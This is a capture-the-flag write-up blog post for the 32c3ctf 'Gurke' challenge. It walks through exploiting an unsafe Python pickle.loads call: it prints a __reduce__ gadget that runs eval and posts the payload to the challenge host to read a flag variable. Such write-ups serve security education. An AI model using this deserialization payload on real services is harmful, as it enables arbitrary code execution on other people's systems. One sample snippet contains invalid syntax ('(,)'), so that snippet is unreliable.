Author: zlowram
Date: 12-29-2015 23:37
Title: 32c3ctf Misc Gurke write-up
Template: post
Comments: enabled

After almost a year without posting anything, here I come with the write-ups for the 32c3ctf.
For this challenge we were provided with the following script:

```python
#!/usr/bin/env python
import sys
import os

import socket
import pickle
import base64
import marshal
import types
import inspect
import encodings.string_escape

class Flag(object):
    def __init__(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("172.17.0.1", 1234))
        self.flag = s.recv(1024).strip()
        s.close()
flag = Flag()

from seccomp import *

f = SyscallFilter(KILL)
f.add_rule_exactly(ALLOW, "read")
f.add_rule_exactly(ALLOW, "write", Arg(0, EQ, sys.stdout.fileno()))
f.add_rule_exactly(ALLOW, "write", Arg(0, EQ, sys.stderr.fileno()))
f.add_rule_exactly(ALLOW, "close")
f.add_rule_exactly(ALLOW, "exit_group")

f.add_rule_exactly(ALLOW, "open", Arg(1, EQ, 0))
f.add_rule_exactly(ALLOW, "stat")
f.add_rule_exactly(ALLOW, "lstat")
f.add_rule_exactly(ALLOW, "lseek")
f.add_rule_exactly(ALLOW, "fstat")
f.add_rule_exactly(ALLOW, "getcwd")
f.add_rule_exactly(ALLOW, "readlink")
f.add_rule_exactly(ALLOW, "mmap", Arg(3, MASKED_EQ, 2, 2))
f.add_rule_exactly(ALLOW, "munmap")
f.load()

data = os.read(0, 4096)
try:
    res = pickle.loads(data)
    print 'res: %r\n' % res
except Exception as e:
    print >>sys.stderr, "exception", repr(e)

os._exit(0)
```

The script is something similar to what is running at the given target host,
which can be accessed via HTTP. If we just send a GET / request, it replies
with a "plz POST" message so we know that it would probably take the content of
the POST and pass it to pickle.loads() call. In the script above we can observe
that the unpickle is not done safely, so the challenge might be about
exploiting it.

Just to refresh a little bit the exploitation of an insecure unpickle, remember
that pickle is supposed to allow representing arbitrary objects, so we could
provide a crafted pickle that represent an object that could be useful to us.
The following snippet allow us to generate a pickle that represents a
"os.getcwd()" object that, once it gets deserialized, it would be executed:

```python
import pickle
import os

class RunSomething(object):
    def __reduce__(self):
		return (os.getcwd, (,))

print pickle.dumps(RunSomething())
```

With this refreshed information about pickle, we could now extend the script so
it sends the POST request to the target host with the pickle payload in it.
Before doing so, we just pay attention to the script we were provided so we can
see that the flag seems to be held by a variable within the same scope than the
picke.loads() call, called "flag". In python exists the "sys.module" structure,
which is a dictionary with information about all de loaded modules, including
the one of the script. If we take into account all of this, we can just write
the final exploit that would retrieve the flag for us:

```python
class RunSomething(object):
    def __reduce__(self):
        return (eval, ("sys.modules['__main__'].flag.flag",))

target = "http://136.243.194.43"
d = pickle.dumps(RunSomething())
r = requests.post(target, data=d)
print r.text
```

We run the script, it sends the POST request with the payload, and retrieve the flag:

```markup
32c3_rooDahPaeR3JaibahYeigoong
```

Greetings to my team [0xb33rs](http://testpurposes.net/) and [nibble](http://twitter.com/nibble_ds) for his help!
